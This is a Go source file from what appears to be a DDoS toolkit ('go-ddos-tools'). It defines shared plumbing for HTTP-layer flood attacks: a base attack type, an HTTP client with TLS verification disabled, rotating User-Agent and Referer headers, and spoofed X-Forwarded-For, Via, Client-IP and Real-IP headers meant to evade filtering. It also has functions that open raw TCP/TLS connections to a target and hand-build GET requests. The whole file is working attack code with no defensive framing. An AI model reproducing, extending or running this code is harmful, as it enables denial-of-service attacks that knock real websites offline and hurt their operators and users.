package layer7

import (
	"crypto/tls"
	"math/rand"
	"net/http"
	"net/url"
	"time"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
	"net"
	"strings"
	"fmt"
)

// BaseAttack provides shared functionality for Layer 7 attacks
type BaseAttack struct {
	Config *core.AttackConfig
	Client *http.Client
}

func NewBaseAttack(cfg *core.AttackConfig) *BaseAttack {
	return &BaseAttack{
		Config: cfg,
		Client: CreateHTTPClient(cfg),
	}
}

func CreateHTTPClient(cfg *core.AttackConfig) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	}

	// TODO: Add proper proxy rotation if needed per request or client
	// For now, we follow the original implementation which created one client per worker usually
	// But here we might want to rotate proxies in the Transport if we want rotation per request

	return &http.Client{
		Transport: transport,
		Timeout:   3 * time.Second,
	}
}

func (b *BaseAttack) AddHeaders(req *http.Request) {
	if len(b.Config.UserAgents) > 0 {
		req.Header.Set("User-Agent", b.Config.UserAgents[rand.Intn(len(b.Config.UserAgents))])
	}

	if len(b.Config.Referers) > 0 {
		referer := b.Config.Referers[rand.Intn(len(b.Config.Referers))]
		req.Header.Set("Referer", referer+url.QueryEscape(b.Config.Target))
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "max-age=0")

	// Spoof IP headers
	spoofIP := utils.RandIPv4()
	req.Header.Set("X-Forwarded-For", spoofIP)
	req.Header.Set("X-Forwarded-Host", b.Config.Target)
	req.Header.Set("Via", spoofIP)
	req.Header.Set("Client-IP", spoofIP)
	req.Header.Set("Real-IP", spoofIP)
}

func EstimateRequestSize(req *http.Request) int {
	size := len(req.Method) + len(req.URL.String()) + 10 // method + URL + protocol
	for k, v := range req.Header {
		for _, val := range v {
			size += len(k) + len(val) + 4 // key: value\r\n
		}
	}
	return size
}

func CreateRawConnection(target string, cfg *core.AttackConfig) (net.Conn, error) {
	targetURL, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	host := targetURL.Host
	if !strings.Contains(host, ":") {
		if targetURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	conn, err := net.DialTimeout("tcp", host, 3*time.Second)
	if err != nil {
		return nil, err
	}

	if targetURL.Scheme == "https" {
		tlsConn := tls.Client(conn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         targetURL.Hostname(),
		})
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return nil, err
		}
		return tlsConn, nil
	}

	return conn, nil
}

func BuildRawHeaders(target string, cfg *core.AttackConfig) string {
	targetURL, _ := url.Parse(target)

	userAgent := "Mozilla/5.0"
	if len(cfg.UserAgents) > 0 {
		userAgent = cfg.UserAgents[rand.Intn(len(cfg.UserAgents))]
	}

	referer := "https://www.google.com/"
	if len(cfg.Referers) > 0 {
		referer = cfg.Referers[rand.Intn(len(cfg.Referers))]
	}

	spoofIP := utils.RandIPv4()

	var builder strings.Builder
	builder.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path))
	builder.WriteString(fmt.Sprintf("Host: %s\r\n", targetURL.Host))
	builder.WriteString(fmt.Sprintf("User-Agent: %s\r\n", userAgent))
	builder.WriteString(fmt.Sprintf("Referer: %s\r\n", referer))
	builder.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
	builder.WriteString("Accept-Language: en-US,en;q=0.9\r\n")
	builder.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	builder.WriteString("Connection: keep-alive\r\n")
	builder.WriteString("Cache-Control: max-age=0\r\n")
	builder.WriteString(fmt.Sprintf("X-Forwarded-For: %s\r\n", spoofIP))
	builder.WriteString(fmt.Sprintf("Via: %s\r\n", spoofIP))

	return builder.String()
}
